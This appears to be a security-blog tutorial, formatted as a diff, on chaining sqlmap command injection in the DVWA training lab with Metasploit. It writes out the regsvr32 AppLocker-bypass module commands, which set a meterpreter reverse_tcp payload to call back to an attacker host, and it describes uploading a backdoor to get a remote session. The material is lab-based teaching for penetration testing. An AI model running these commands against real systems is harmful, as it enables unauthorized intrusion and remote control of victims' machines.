@@ -1,0 +1,40 @@
+
+Command Injection Exploitation through Sqlmap in DVWA (OS-cmd)
+
+In this article we will see how to perform command injection using sqlmap and try to execute any cmd command through sqlmap if web server is having sql vulnerability.
+Xampp/Wamp Server                                                                                                            
+DVWA Lab
+Kali Linux: Burp suite, sqlmap tool              
+Very first you need to install DVWA lab in your XAMPP or WAMP server, read full article from here
+Now open the DVWA in your pc and login with following credentials:
+Username – admin
+Password – password
+Click on DVWA Security and set Website Security Level low
+From the list of vulnerability select SQL Injection for your attack. Type user ID: 1 in text box.  Don’t click on submit button without setting browser proxy. Set your browser proxy to make burp suite work properly.  
+
+Turn on burp suite click on proxy in menu bar and go for intercept is on button. Come back and click on submit button in dvwa. Burp suit will provide” cookie” and “referrer” under fetched data which will later use in sqlmap commands.
+
+Lets enumerate all databases name using “refrere and cookies” under sqlmap command.
+
+Notice the image given below it has dumped all names of database. Now we are going to choose  dvwa for command injection attack.
+
+Now open another terminal for metasploit framework and Type msfconsole.
+This module simplifies the Regsvr32.exe Application Whitelisting Bypass technique. The module creates a web server that hosts a .sct file. When the user types the provided regsvr32 command on a system, regsvr32 will request the .sct file and then execute the included PowerShell command. This command then downloads and executes the specified payload (similar to the web_delivery module with PSH).
+ Both web requests (i.e., the .sct file and PowerShell download and execute) can occur on the same port.
+msf > use exploit/windows/misc/regsvr32_applocker_bypass_server
+msf exploit(regsvr32_applocker_bypass_server) > set payload windows/meterpreter/reverse_tcp
+msf exploit(regsvr32_applocker_bypass_server) > set lhost 192.168.0.104
+msf exploit(regsvr32_applocker_bypass_server) > set srvhost 192.168.0.104
+ msf exploit(regsvr32_applocker_bypass_server) > set srvport 5555
+msf exploit(regsvr32_applocker_bypass_server) > exploit
+Above module will generate a malicious code as dll file. Copy the selected part for dll file and then run this malicious code using sqlmap comand
+
+Now we’re going to execute dll file through CMD command using sqlmap therefore paste above malicious code in sqlmap command as shown in the image given below.
+
+Then type 4 for php payload and type 1 for common location to upload payload as backdoor in victim PC.
+
+As soon as the command will execute come back to metasploit framework and you will get meterpreter session 1 opened.
+Type sessions -i 1
+meterpreter>sysinfo
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
